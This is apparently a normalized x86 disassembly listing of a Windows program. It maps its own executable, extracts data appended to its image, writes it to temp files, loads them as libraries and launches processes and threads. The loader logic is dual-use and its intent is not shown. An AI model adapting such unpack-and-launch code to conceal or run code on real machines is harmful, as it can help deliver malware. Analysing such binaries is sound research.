add esi 0x2
test ax ax
jne r-xdata
sub esi ecx
sar esi 0x1
lea eax [ esi * 2 + 0x2 ]
push eax
call sub_4040b9
lea ecx [ ebp - 0x65c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
mov [ edi + 0x8 ] eax
call sub_4042aa
add esp 0x10
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea esi [ ebp - 0x454 ]
lea esi [ esi + ecx * 2 ]
inc esi
cmp esi edx
jge r-xdata
mov edi [ ebp - 0x664 ]
test ebx ebx
je r-xdata
mov edi [ ebp - 0x664 ]
test ebx ebx
je r-xdata
inc esi
test ebx ebx
je r-xdata
inc esi
test ebx ebx
je r-xdata
inc esi
test ebx ebx
je r-xdata
inc esi
test ebx ebx
je r-xdata
inc esi
test ebx ebx
je r-xdata
mov edi [ ebp - 0x664 ]
test ebx ebx
je r-xdata
inc esi
cmp esi edx
jge r-xdata
inc esi
cmp esi edx
jge r-xdata
inc esi
cmp esi edx
jge r-xdata
inc edx
inc esi
cmp edx ebx
jl r-xdata
inc [ edi + 0x18 ]
mov ebx [ ebp - 0x660 ]
jmp r-xdata
test ebx ebx
je r-xdata
inc esi
cmp esi edx
jl r-xdata
mov [ ebp - 0x243 ] 0x0
jmp r-xdata
mov [ ebp - 0x244 ] 0x0
jmp r-xdata
mov edi [ ebp - 0x664 ]
cmp esi edx
jge r-xdata
cmp esi edx
jge r-xdata
cmp esi edx
jge r-xdata
cmp esi edx
jge r-xdata
cmp esi edx
jge r-xdata
mov [ ebp - 0x242 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x668 ]
mov ecx [ edi + esi * 4 ]
call sub_402410
test al al
je r-xdata
mov eax [ ebp - 0x668 ]
mov ecx [ eax + esi * 4 ]
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
mov eax [ ebp - 0x668 ]
mov ecx [ eax + esi * 4 ]
lea edx [ ecx + 0x2 ]
jmp r-xdata
mov edi [ ebp - 0x668 ]
mov [ ebp - 0x244 ] 0x101
push [ edi + esi * 4 ]
call sub_404167
mov ebx eax
add esp 0x4
mov [ ebp - 0x248 ] ebx
test ebx ebx
jne r-xdata
mov edx [ ebp - 0x664 ]
lea ecx [ ebp - 0x24c ]
call sub_401710
mov ecx [ ebp - 0x670 ]
mov edx [ ebp - 0x674 ]
push 0x240
mov [ edx + ecx * 4 ] eax
lea eax [ ebp - 0x24c ]
inc ecx
push 0x0
push eax
mov [ ebp - 0x670 ] ecx
call sub_406ba0
add esp 0xc
mov eax [ ebp - 0x668 ]
mov eax [ eax + esi * 4 ]
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov eax [ ebp - 0x668 ]
lea ecx [ ebp - 0x24c ]
mov edx [ eax + esi * 4 ]
call sub_401b00
push 0x1
push 0x3
jmp r-xdata
push 0x2
jmp r-xdata
mov edx [ ebp - 0x660 ]
mov ecx [ edi + esi * 4 ]
lea edx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx * 2 + 0x2 ]
push eax
call sub_4040b9
mov edi [ ebp - 0x664 ]
mov edx eax
mov eax [ ebp - 0x668 ]
mov [ edi + 0x8 ] edx
mov ecx [ eax + esi * 4 ]
add esp 0x4
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x66c ] eax
lea esp [ esp ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
mov eax [ edi + esi * 4 ]
or ebx 0xffffffff
mov [ ebp - 0x248 ] ebx
mov [ ebp - 0x24c ] eax
jmp r-xdata
mov ebx [ ebp - 0x248 ]
mov eax [ ebp - 0x668 ]
lea ecx [ ebp - 0x24c ]
mov edx [ eax + esi * 4 ]
call sub_401c10
add esp 0x4
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx * 2 + 0x2 ]
push eax
call sub_4040b9
mov edi [ ebp - 0x664 ]
mov edx eax
mov eax [ ebp - 0x668 ]
mov [ edi + 0x4 ] edx
mov ecx [ eax + esi * 4 ]
add esp 0x4
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x66c ] eax
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x66c ]
jmp r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx * 2 + 0x2 ]
push eax
call sub_4040b9
mov edi [ ebp - 0x664 ]
mov edx eax
mov eax [ ebp - 0x668 ]
mov [ edi + 0xc ] edx
mov ecx [ eax + esi * 4 ]
add esp 0x4
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x66c ] eax
lea esp [ esp ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x66c ]
mov eax [ ebp - 0x668 ]
sar ecx 0x1
push [ eax + esi * 4 ]
lea eax [ ecx + 0x1 ]
push eax
push edx
call sub_4042aa
mov edx [ ebp - 0x660 ]
add esp 0xc
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x66c ]
jmp r-xdata
sub_402430
push ebp
mov ebp esp
push ecx
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push ecx
mov [ ebp - 0x4 ] 0x0
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push 0x0
push 0x0
push 0x0
push 0x2
push 0x0
push esi
call [ CreateFileMappingW@IAT ]
mov edi eax
test edi edi
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x0
push 0x4
push edi
call [ MapViewOfFile@IAT ]
push edi
mov [ ebp - 0x4 ] eax
call [ CloseHandle@IAT ]
sub_4024b0
push ebp
mov ebp esp
push ecx
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0xc0000000
push ecx
mov [ ebp - 0x4 ] 0x0
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push 0x0
push 0x0
push 0x0
push 0x4
push 0x0
push esi
call [ CreateFileMappingW@IAT ]
mov edi eax
test edi edi
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x0
push 0x6
push edi
call [ MapViewOfFile@IAT ]
push edi
mov [ ebp - 0x4 ] eax
call [ CloseHandle@IAT ]
sub_402530
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push ecx
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
xor edx edx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetFileSizeEx@IAT ]
push esi
test eax eax
jne r-xdata
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
xor ecx ebp
pop esi
call sub_404072
mov esp ebp
pop ebp
retn
call [ CloseHandle@IAT ]
sub_4025b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi ecx
xor ecx ecx
xor ebx ebx
cmp [ ebp + 0xc ] edi
jbe r-xdata
lea eax [ esi + edx ]
mov [ ebp + 0x14 ] eax
cmp esi eax
jae r-xdata
pop edi
pop esi
xor al al
pop ebx
pop ebp
retn
pop edi
xor eax eax
test ebx ebx
pop esi
setne al
pop ebx
pop ebp
retn
sub esi edi
inc esi
mov edx eax
lea ebx [ ebx ]
xor ecx ecx
inc ecx
cmp ecx edi
jne r-xdata
mov al [ edi + esi - 0x1 ]
cmp al [ ecx + r--data ]
jne r-xdata
inc esi
lea eax [ edi - 0x1 ]
add eax esi
cmp eax edx
jb r-xdata
push edi
push 0x0
push esi
mov ebx esi
call sub_406ba0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
call sub_406550
mov edx [ ebp + 0x14 ]
add esp 0x18
sub_402630
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
jmp [ GetModuleHandleA@IAT ]
mov ecx [ ebp + 0x4 ]
call sub_402770
test eax eax
je r-xdata
mov eax [ eax + 0x2c ]
pop ebp
retn 0x4
sub_402660
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
jmp [ GetModuleHandleW@IAT ]
mov ecx [ ebp + 0x4 ]
call sub_402770
test eax eax
je r-xdata
mov eax [ eax + 0x2c ]
pop ebp
retn 0x4
sub_402690
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x4 ]
mov esi [ rw-data ]
test esi esi
je r-xdata
mov eax r--data
xor ecx ecx
cmp [ esi ] ecx
je r-xdata
mov eax [ esi ]
lea ebx [ ebx ]
mov eax [ esi + ecx * 4 + 0x4 ]
inc ecx
test eax eax
jne r-xdata
cmp [ eax + 0x9 ] 0x1
jne r-xdata
cmp [ eax + 0x24 ] 0x1
jne r-xdata
pop edi
mov eax r--data
pop esi
pop ebp
retn
mov edx [ eax + 0x2c ]
cmp edx edi
ja r-xdata
mov eax [ eax + 0x30 ]
add eax edx
cmp eax edi
ja r-xdata
mov eax [ esi + ecx * 4 ]
test eax eax
je r-xdata
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_402700
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x4 ]
mov esi [ rw-data ]
test esi esi
je r-xdata
mov eax r--data
xor ecx ecx
cmp [ esi ] ecx
je r-xdata
mov eax [ esi ]
lea ebx [ ebx ]
mov eax [ esi + ecx * 4 + 0x4 ]
inc ecx
test eax eax
jne r-xdata
cmp [ eax + 0x9 ] 0x1
jne r-xdata
cmp [ eax + 0x24 ] 0x1
jne r-xdata
pop edi
mov eax r--data
pop esi
pop ebp
retn
mov edx [ eax + 0x2c ]
cmp edx edi
ja r-xdata
mov eax [ eax + 0x30 ]
add eax edx
cmp eax edi
ja r-xdata
mov eax [ esi + ecx * 4 ]
test eax eax
je r-xdata
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_402770
push esi
mov esi [ rw-data ]
push edi
mov edi ecx
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
xor edx edx
cmp [ esi ] edx
je r-xdata
mov eax [ esi ]
mov eax [ esi + edx * 4 + 0x4 ]
inc edx
test eax eax
jne r-xdata
cmp [ eax + 0x9 ] 0x1
jne r-xdata
cmp [ eax + 0x24 ] 0x1
jne r-xdata
mov ecx [ eax + 0x2c ]
cmp ecx edi
ja r-xdata
mov eax [ eax + 0x30 ]
add eax ecx
cmp eax edi
ja r-xdata
mov eax [ esi + edx * 4 ]
pop edi
pop esi
retn
sub_4027c0
push ebp
mov ebp esp
and esp 0xfffffff0
sub esp 0x698
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x694 ] eax
mov al [ r--data ]
movq xmm0 [ r--data ]
push esi
push edi
mov [ esp + 0x480 ] al
xor eax eax
push 0x206
push eax
mov [ esp + 0x498 ] ax
movq [ esp + 0x478 ] xmm0
movq xmm0 [ r--data ]
lea eax [ esp + 0x49a ]
push eax
movq [ esp + 0x484 ] xmm0
call sub_406ba0
add esp 0xc
mov [ esp + 0x28 ] 0x0
push sub_402ea0
call [ SetUnhandledExceptionFilter@IAT ]
push 0x104
lea eax [ esp + 0x494 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
push ecx
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x20 ]
call sub_401d90
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ esp + 0x490 ]
call sub_402430
mov edi eax
mov [ esp + 0x2c ] edi
test edi edi
je r-xdata
mov esi [ esp + 0x14 ]
push 0x5c
push [ esi ]
call sub_404198
add esp 0x8
mov edx esi
jmp r-xdata
mov edx [ esp + 0x14 ]
mov edx [ edi + 0x3c ]
add edx edi
movzx eax [ edx + 0x6 ]
lea ecx [ eax + eax * 4 ]
movzx eax [ edx + 0x14 ]
add eax edx
mov esi [ eax + ecx * 8 + 0x4 ]
add esi [ eax + ecx * 8 ]
lea ecx [ esp + 0x490 ]
add esi edi
call sub_402530
dec eax
add eax edi
push 0x130
mov [ esp + 0x28 ] eax
xor edi edi
lea eax [ esp + 0xb4 ]
push edi
push eax
mov [ esp + 0x4c ] 0x42baaf3d
mov [ esp + 0x50 ] 0x30b49e9d
mov [ esp + 0x54 ] 0x80da22b4
mov [ esp + 0x58 ] 0x41ac9f2c
call sub_406ba0
movdqa xmm0 [ esp + 0x47c ]
add esp 0xc
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xd0 ] 0x1
mov [ esp + 0xe8 ] 0x4
mov [ esp + 0xec ] 0x4
mov [ esp + 0xe4 ] 0xa
movdqa [ esp + 0xb0 ] xmm0
movdqa [ esp + 0xf0 ] xmm0
call sub_401290
mov eax [ esp + 0x24 ]
cmp esi eax
jae r-xdata
mov ecx [ esp + 0x1c ]
call sub_4018e0
mov ecx [ esp + 0x69c ]
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_404072
mov esp ebp
pop ebp
retn
push [ esp + 0x2c ]
call [ UnmapViewOfFile@IAT ]
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
call sub_4031e0
lea ecx [ ecx ]
push 0x20
lea eax [ esp + 0x1c ]
push esi
push eax
lea edx [ esp + 0x5c ]
lea ecx [ esp + 0x8c ]
call sub_401000
add esi [ esp + 0x24 ]
mov edx [ esp + 0x74 ]
inc edi
add esp 0xc
mov [ esp + 0x10 ] esi
mov [ esp + 0x20 ] edi
test edx edx
je r-xdata
cmp eax 0x20
jb r-xdata
mov edx [ esp + 0x60 ]
mov ecx edx
and ecx 0xf
mov eax edx
sub eax ecx
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x64 ]
sbb eax 0x0
mov [ esp + 0x30 ] ecx
mov [ esp + 0x3c ] eax
test ecx ecx
je r-xdata
mov ecx [ esp + 0x14 ]
mov ecx [ ecx ]
lea esi [ ecx + 0x2 ]
xor edi edi
mov edi 0x10
sub edi ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx esi
sar ecx 0x1
add edx 0x8
lea esi [ edx + ecx * 2 ]
push esi
call sub_4040b9
mov edi eax
xor eax eax
mov [ edi ] ax
mov eax [ esp + 0x18 ]
add esp 0x4
push [ eax ]
shr esi 0x1
push r--data
push esi
push edi
call sub_40414b
mov ecx edi
add esp 0x10
lea edx [ ecx + 0x2 ]
mov ecx [ esp + 0x1c ]
test ecx ecx
je r-xdata
cmp [ esp + 0x28 ] 0x0
je r-xdata
cmp [ esp + 0x6c ] 0x0
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push [ esp + 0x68 ]
mov esi [ esp + 0x14 ]
sub ecx edx
sar ecx 0x1
lea eax [ esp + 0x1c ]
push esi
lea edx [ edi + ecx * 2 ]
push eax
lea ecx [ esp + 0x8c ]
call sub_401000
add esi [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
add esp 0xc
cmp [ eax + 0x18 ] 0x0
mov [ esp + 0x10 ] esi
je r-xdata
lea eax [ edx + edi ]
add esi eax
jmp r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
push 0x240
lea eax [ esp + 0x234 ]
push 0x0
push eax
call sub_406ba0
mov eax [ esp + 0x2c ]
add esp 0xc
mov [ esp + 0x250 ] 0x1
mov [ esp + 0x24c ] 0x1
mov [ esp + 0x234 ] eax
mov [ esp + 0x258 ] 0x1
lea esi [ esp + 0x230 ]
jmp r-xdata
push 0x44
lea eax [ esp + 0x1ec ]
push 0x0
push eax
call sub_406ba0
add esp 0xc
lea eax [ esp + 0x40 ]
push eax
lea eax [ esp + 0x1ec ]
push eax
mov eax [ esp + 0x1c ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
xorps xmm0 xmm0
push edi
mov [ esp + 0x20c ] 0x44
movdqa [ esp + 0x64 ] xmm0
push [ eax ]
call [ CreateProcessW@IAT ]
push [ esp + 0x40 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ esp + 0x44 ]
call esi
push [ esp + 0x2c ]
call [ UnmapViewOfFile@IAT ]
push edi
call sub_404081
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
add esp 0x4
call sub_4018e0
mov eax 0x1
pop edi
pop esi
mov ecx [ esp + 0x694 ]
xor ecx esp
call sub_404072
mov esp ebp
pop ebp
retn
push edi
call sub_404081
add esp 0x4
movdqa xmm0 [ esp + 0x50 ]
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xd0 ] 0x1
mov [ esp + 0xe8 ] 0x4
mov [ esp + 0xec ] 0x4
mov [ esp + 0xe4 ] 0xa
movdqa [ esp + 0xb0 ] xmm0
movdqa [ esp + 0xf0 ] xmm0
call sub_401290
mov eax [ esp + 0x24 ]
cmp esi eax
jae r-xdata
xor esi esi
cmp [ ecx ] esi
je r-xdata
mov eax [ esp + 0x24 ]
sub eax [ esp + 0x10 ]
xor ecx ecx
inc eax
add edi [ esp + 0x60 ]
cdq
adc ecx [ esp + 0x64 ]
cmp edx ecx
jb r-xdata
mov edi [ esp + 0x20 ]
jmp r-xdata
mov esi [ esp + 0x10 ]
mov eax ecx
ja r-xdata
movq xmm0 [ esp + 0x40 ]
sub eax esi
movq [ esp + 0x80 ] xmm0
movq xmm0 [ esp + 0x48 ]
inc eax
cdq
movq [ esp + 0x88 ] xmm0
xorps xmm0 xmm0
lea ecx [ esp + 0xb0 ]
movaps [ esp + 0x90 ] xmm0
mov [ esp + 0xa0 ] 0x0
mov [ esp + 0xa8 ] sub_401630
mov [ esp + 0xac ] ecx
mov [ esp + 0xa4 ] 0x0
test edx edx
jne r-xdata
mov esi [ ecx + esi * 4 ]
test esi esi
je r-xdata
inc esi
cmp [ ecx + esi * 4 ] 0x0
lea eax [ ecx + esi * 4 ]
jne r-xdata
cmp [ esi + 0x9 ] 0x1
jne r-xdata
cmp eax edi
jb r-xdata
mov eax [ eax ]
mov edx [ esp + 0x20 ]
cmp [ eax + 0x4 ] edx
mov edx [ esp + 0x60 ]
je r-xdata
push [ esp + 0x64 ]
lea ecx [ esi + 0x38 ]
push [ esp + 0x64 ]
call sub_402eb0
add esp 0x8
push 0x4
push 0x1000
push [ esp + 0x68 ]
push 0x0
call [ VirtualAlloc@IAT ]
jmp r-xdata
cmp [ esi + 0x20 ] 0x0
je r-xdata
push [ esp + 0x34 ]
lea eax [ esp + 0x1c ]
push [ esp + 0x14 ]
mov edx edi
push eax
lea ecx [ esp + 0x8c ]
call sub_401000
mov eax [ esp + 0x1c ]
add eax [ esp + 0x24 ]
add esp 0xc
cmp [ esp + 0x30 ] 0x0
mov [ esp + 0x10 ] eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
mov esi [ esp + 0x10 ]
add esi 0x38
mov ecx esi
lea edx [ ecx + 0x2 ]
lea ecx [ ecx ]
lea eax [ esp + 0x7c ]
push eax
lea eax [ esp + 0x7c ]
push eax
push [ esp + 0x68 ]
push edi
call [ CheckSumMappedFile@IAT ]
test eax eax
je r-xdata
push 0x10
push eax
lea eax [ esp + 0x20 ]
push eax
lea edx [ esp + 0x47c ]
lea ecx [ esp + 0x8c ]
call sub_401000
add esp 0xc
lea eax [ esp + 0x470 ]
push [ esp + 0x30 ]
push eax
mov eax [ esp + 0x3c ]
add eax edi
push eax
call sub_406550
mov eax [ esp + 0x1c ]
add esp 0xc
add eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx * 2 + 0x2 ]
push eax
call sub_4040b9
mov edx eax
mov eax [ esp + 0x18 ]
mov ecx esi
add esp 0x4
mov [ eax + 0x14 ] edx
lea edi [ ecx + 0x2 ]
lea ecx [ ecx ]
xorps xmm0 xmm0
movdqa [ esp + 0x80 ] xmm0
movdqa [ esp + 0x90 ] xmm0
cmp [ esi + 0x9 ] 0x1
jne r-xdata
mov eax [ esp + 0x78 ]
test eax eax
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
lea eax [ ecx * 2 + 0x2 ]
push eax
push esi
push edx
call sub_406550
add esp 0xc
push edi
call [ UnmapViewOfFile@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
jmp r-xdata
cmp [ esi + 0x9 ] 0x1
jne r-xdata
cmp eax [ esp + 0x7c ]
jne r-xdata
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov edx [ esp + 0x60 ]
push esi
mov ecx edi
call sub_403730
add esp 0x4
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov eax [ edi + 0x3c ]
movzx eax [ eax + edi + 0x16 ]
shr eax 0xd
and eax 0x1
mov [ esi + 0x28 ] eax
je r-xdata
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov [ esi + 0x24 ] 0x1
push edi
call [ UnmapViewOfFile@IAT ]
lea eax [ esi + 0x38 ]
push eax
call [ LoadLibraryW@IAT ]
mov [ esi + 0x2c ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
cmp [ esi + 0x1c ] 0x0
mov ecx 0x1
cmovne eax ecx
mov [ esp + 0x28 ] eax
mov [ esi + 0x24 ] cl
jmp r-xdata
sub_402eb0
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov [ ebp - 0x214 ] eax
lea eax [ ebp - 0x20c ]
push eax
push 0x104
mov edi ecx
mov [ ebp - 0x210 ] 0x0
call [ GetTempPathW@IAT ]
test eax eax
jne r-xdata
push edi
push 0x0
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ GetTempFileNameW@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
push esi
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0xc0000000
push edi
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x4
push 0x0
push edi
call [ MoveFileExW@IAT ]
push 0x0
push ebx
push [ ebp - 0x214 ]
push 0x4
push 0x0
push esi
call [ CreateFileMappingW@IAT ]
mov ebx [ CloseHandle@IAT ]
mov edi eax
test edi edi
je r-xdata
pop esi
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
mov esp ebp
pop ebp
retn
push esi
call ebx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x210 ]
pop esi
pop edi
xor ecx ebp
pop ebx
call sub_404072
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x0
push 0x6
push edi
call [ MapViewOfFile@IAT ]
push edi
mov [ ebp - 0x210 ] eax
call ebx
sub_402fb0
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x28 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x9 ] 0x1
mov eax [ ebx + 0x34 ]
jne r-xdata
mov eax [ ebx + 0x34 ]
call eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push 0x0
push 0x1
push [ ebx + 0x2c ]
call eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop ebx
call sub_404072
mov esp ebp
pop ebp
retn 0x4
push [ ebx + 0x10 ]
push [ ebx + 0x30 ]
push [ ebx + 0x2c ]
call eax
add esp 0xc
jmp r-xdata
cmp [ eax ] 0x0
mov [ ebp - 0x90 ] 0x0
je r-xdata
push esi
push edi
xor edi edi
mov [ ebp - 0x8c ] edi
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
sub esi ecx
sar esi 0x1
inc esi
push esi
call sub_4040b9
add esp 0x4
mov [ ebp - 0x94 ] eax
push 0x0
push 0x0
push esi
push eax
push 0xffffffff
push [ ebp - 0x88 ]
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x94 ]
call sub_404081
mov edx [ ebp - 0x90 ]
mov eax [ ebx + 0x18 ]
inc edx
add esp 0x4
cmp [ eax + edx * 4 ] 0x0
lea edi [ edx * 4 ]
mov [ ebp - 0x90 ] edx
mov [ ebp - 0x8c ] edi
jne r-xdata
push 0x80
lea eax [ ebp - 0x84 ]
push 0x0
push eax
call sub_406ba0
add esp 0xc
push [ ebp - 0x94 ]
push [ ebx + 0x2c ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x88 ] eax
test eax eax
je r-xdata
mov eax [ eax + edi ]
mov eax [ eax ]
mov esi eax
mov [ ebp - 0x88 ] eax
lea ecx [ esi + 0x2 ]
pop edi
pop esi
jmp r-xdata
mov ecx [ ebx + 0x18 ]
mov ecx [ ecx + edi ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0x34 ]
push [ ebp - 0x38 ]
push [ ebp - 0x3c ]
push [ ebp - 0x40 ]
push [ ebp - 0x44 ]
push [ ebp - 0x48 ]
push [ ebp - 0x4c ]
push [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push [ ebp - 0x5c ]
push [ ebp - 0x60 ]
push [ ebp - 0x64 ]
push [ ebp - 0x68 ]
push [ ebp - 0x6c ]
push [ ebp - 0x70 ]
push [ ebp - 0x74 ]
push [ ebp - 0x78 ]
push [ ebp - 0x7c ]
push [ ebp - 0x80 ]
push [ ebp - 0x84 ]
call eax
add esp 0x80
xor edi edi
cmp [ ecx ] edi
je r-xdata
xor esi esi
lea ecx [ ecx ]
push [ ecx ]
call sub_404170
add esp 0x4
dec eax
je r-xdata
mov ecx [ ecx + esi ]
mov eax [ ecx + 0x8 ]
dec eax
je r-xdata
mov eax [ ebp - 0x88 ]
mov eax [ ecx ]
jmp r-xdata
dec eax
jne r-xdata
mov [ ebp + esi - 0x84 ] eax
mov ecx [ ebp - 0x8c ]
mov eax [ ebx + 0x18 ]
inc edi
mov eax [ eax + ecx ]
lea esi [ edi * 4 ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
jmp r-xdata
sub_4031e0
push ebp
mov ebp esp
mov eax 0x1084
call sub_40b730
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov eax ecx
push esi
push edi
mov esi edx
mov [ ebp - 0x1074 ] eax
mov [ rw-data ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404072
mov esp ebp
pop ebp
retn
push 0x1000
xor edi edi
lea eax [ ebp - 0x1008 ]
push edi
xor ebx ebx
push eax
mov [ ebp - 0x1070 ] ebx
call sub_406ba0
add esp 0xc
lea ecx [ esi + 0x14 ]
call sub_4034b0
mov [ ebp - 0x1080 ] eax
test eax eax
je r-xdata
mov esi [ ebp - 0x1074 ]
cmp [ esi ] ebx
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
mov esi edi
test edi edi
je r-xdata
mov eax esi
mov [ ebp - 0x1078 ] esi
lea esp [ esp ]
push 0xffffffff
push 0x1
lea eax [ ebp - 0x1008 ]
push eax
push edi
call [ WaitForMultipleObjects@IAT ]
test edi edi
je r-xdata
lea ebx [ ebp + edi * 4 - 0x100c ]
mov eax [ ebp - 0x1074 ]
inc ebx
cmp [ eax + ebx * 4 ] 0x0
lea eax [ eax + ebx * 4 ]
mov [ ebp - 0x1070 ] ebx
mov [ ebp - 0x1078 ] eax
jne r-xdata
cmp [ esi + 0x9 ] 0x1
je r-xdata
mov eax [ ebp - 0x1080 ]
test eax eax
je r-xdata
mov ebx [ CloseHandle@IAT ]
lea esi [ ebp + edi * 4 - 0x100c ]
lea esp [ esp ]
push [ ebx ]
call [ ResumeThread@IAT ]
push 0x0
call [ Sleep@IAT ]
lea ebx [ ebx - 0x4 ]
dec esi
jne r-xdata
mov esi [ eax ]
cmp [ esi + 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0x100c ]
push eax
push 0x4
push esi
push sub_402fb0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp + edi * 4 - 0x1008 ] eax
test eax eax
je r-xdata
